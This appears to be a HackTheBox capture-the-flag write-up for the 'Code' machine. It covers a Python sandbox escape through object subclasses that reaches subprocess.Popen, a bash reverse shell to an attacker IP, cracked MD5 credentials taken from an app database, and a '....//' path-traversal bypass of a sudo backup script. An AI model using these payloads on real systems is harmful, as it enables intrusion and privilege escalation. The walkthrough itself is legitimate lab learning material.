# Code

## Handout

So as the usual web-based machines in hackthebox, a simple IP address and no foothold credentials.

```bash
target = 10.10.11.62
echo "code.htb 10.10.11.62" | sudo tee -a /etc/hosts
```

## Enumeration
### Nmap

```bash
nmap $target -sV -sC -vv -Pn -oN code-nmap
# Nmap 7.95 scan initiated Tue Jul 22 07:44:08 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -Pn -vv -T4 -oN nmap-code 10.10.11.62

```

So, `HTTP` on 5000 and `SSH` which of course we'll forget about for now as it's not the usual foothold.

Usually at this point, I launch a UDP scan at the background because we never know. 

And even further, I'd like to run a full poprts scan using `-p-` just in case there is something running on an usual port not included in Nmap's top 1000.

### Stuff that lead to nothing
So, no subdomains, no vhosts and no hidden directories. Ffuf and other fuzzers lead to nothing so let's focus on the web page we're given.

### Foothold 

So, we're facing a python code editor. The first thing to test is the possibility to import some modules to serve us a reverse shell or whatever it is we want to perform on the machine.

And of course, we're facing an error:
```python
import math
Use of restricted keywords is not allowed.
```
So we're being filtered no matter what the module is. So we'll definetly go for escaping the sandbox we're put into.

#### Foothold: Sandbox-Escaping
Not only the `import` keyword is restricted, but also `eval`, `__builtins__`, `open`.
So we need a more sophisticated tricky way to find our way in.

A simply google search lead me to this payload:
```python
print(().__class__.__bases__[0])
```
Which prints out the juicy stuff:

![subclasses dump](assets/htb-code-1.png)


So we need to find the `Popen` subclass since it's our way to pop a reverse shell.
Some digging in more we find the one and only:

```python
print(().__class__.__bases__[0].__subclasses__()[317])

<class 'subprocess.Popen'>
```
So at index 317. We simply fillout a revshell and execute the payload:

```bash
nc -nlvp 9443
```

```python
().__class__.__bases__[0].__subclasses__()[317](
    ['/bin/bash', '-c', 'bash -i >& /dev/tcp/10.10.16.48/9443 0>&1']
)
```

And got a shell as `app-production` user.

### User Flag:
Not so much searching, the home directory contained the user flag.  Which I thought at the beginning that it was a dummy put by a player.

>User flag owned
{: .prompt-tip}



### Pivoting

Poking around a bit for the app directories and home directories we find this:

```bash
app-production@code:~/app$ ls -l instance
ls -l instance
total 16
-rw-r--r-- 1 app-production app-production 16384 Jul 22 14:10 database.db
app-production@code:~/app$ cat instance/database.db
cat instance/database.db
O"OPtablecodecodeCREATE TABLE code (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        name VARCHAR(100) NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
)*7tableuseruserCREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password VARCHAR(80) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
QQR*Mmartin3de6f30c4a09c27fc71932bfc68474be/#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3

&$rtin# Cprint("Functionality test")Testapp-production@code:~/app$ ls -l /home
ls -l /home
total 8
drwxr-x--- 7 app-production app-production 4096 Jul 22 12:51 app-production
drwxr-x--- 9 martin         martin         4096 Jul 22 14:06 martin

```
So our job here is that we need to to pivot to martin and get the user.
Not so much thinking, that an md5 hash of Martin's password, which we can confirm using `hashid` command.

So, a weak password could be cracked, which is the case: **martin:nafeelswordsmaster**

And we ssh into the machine:

```bash
ssh martin@$target
```

>SSH as martin
{: .prompt-tip}


### Privilege Escalation


We move on now and re-do a whole enumeration on this martin user.

Shortly enough, we find a misconfigured backup script we can run as a sudo user:

```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Here is what this script does:
1. Ensures that the script is called with exactly one single existing JSON file as its parameter.
2. Check for the allowed path `/home` and `/var`
3. Sanitizes the given pathes by removing `../` substrings to filter out directory traversal attempts.
4. Runs the `/usr/bin/backy` binary on the sanitized target.

This script may be vulnerable to a symlink file in the specified allowed directories. If we can create a symlink to `/root` and prepare the required JSON file, we can get the root flag simply. 
But, there is a low-hanging fruit we can try: What is it doesn't clear out `....//` ? It is the same as `../` on linux systems and its not as hardcoded.

If that doesn't work, we can look for vulnerbilities in the `/usr/bin/backy` binary but first let's try to create the JSON file with the required fields.

```JSON
{
  "destination": "/home/martin/",
  "directories_to_archive": [
    "/home/....//root/"
  ]
}
```
And surely enough:

```bash
sudo /usr/bin/backy.sh evilsa.json

```

We finaly get this file `code_home_.._root_2025_July.tar.bz2` which we'll simply unzip using:

```bash
tar -xvf code_home_.._root_2025_July.tar.bz2
```

>And We got our root flag!
